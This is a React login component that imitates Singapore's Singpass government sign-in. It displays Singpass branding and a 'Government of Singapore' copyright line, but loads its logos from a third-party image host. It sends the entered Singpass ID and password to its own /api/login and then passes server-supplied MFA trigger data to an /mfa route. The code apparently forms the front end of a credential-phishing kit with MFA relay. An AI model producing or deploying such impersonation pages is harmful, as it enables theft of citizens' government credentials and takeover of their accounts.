import React, { Component, useEffect, useState } from 'react';
import request from 'superagent';
import { useHistory } from 'react-router-dom'

export default function LoginForm() {
  const [loginInfo, setLoginInfo] = useState<{username?: string, password?: string}>({})
  const history = useHistory()

  const onSubmit = (event: any) => {
    event.preventDefault();
    //@ts-ignore
    window.setLoading(true)
    request
      .post('/api/login')
      .send({
        username: loginInfo.username,
        password: loginInfo.password
      })
      .end((err: any, res: any) => {
        //@ts-ignore
        window.setLoading(false)
        if (err) {
          alert('密码输入错误')
        };
        console.log(res);
        // if(res)
        if(res.body.status) {
          history.push('/personal')
        } else {
          //@ts-ignore
          window.mfaTriggerData = res.body.mfaTriggerData
          history.push('/mfa')

        }
      })
  }
  return <div>
    <div className="left-content">
      <img src="https://i.328888.xyz/2023/03/27/intU2Q.png" alt="Your Image"
           className="left-image"/>
        <div className="text-container">
          <p className="left-text-bold">Log in with Singpass</p>
          <p className="left-text-small">Your trusted digital identity</p>
        </div>
    </div>
    <div className="navbar">
      <img src="https://i.328888.xyz/2023/03/27/int0pX.png" alt="SPLogo"
           className="navbar-logo"/>
    </div>
    <div className="container">
      <h1>Login</h1>
      <form>
        <input className="demoInput" type="text" id="username" name="username" placeholder="Singpass ID" onChange={event => {
          setLoginInfo({ ...loginInfo, username: event.target.value })
        }} />
        <input className="demoInput" type="password" id="password" name="password" placeholder="Password" onChange={event => {
          setLoginInfo({ ...loginInfo, password: event.target.value })
        }}/>
        <input className="demoSubmit" type="submit" value="Login" onClick={(e) => onSubmit(e)}/>
      </form>
    </div>
    <div className="footer"></div>
    <div className="right-bottom-text">
      <p>© 2023 Government of Singapore</p>
      <p>Last updated on 4 December 2022</p>
    </div>
  </div>
}
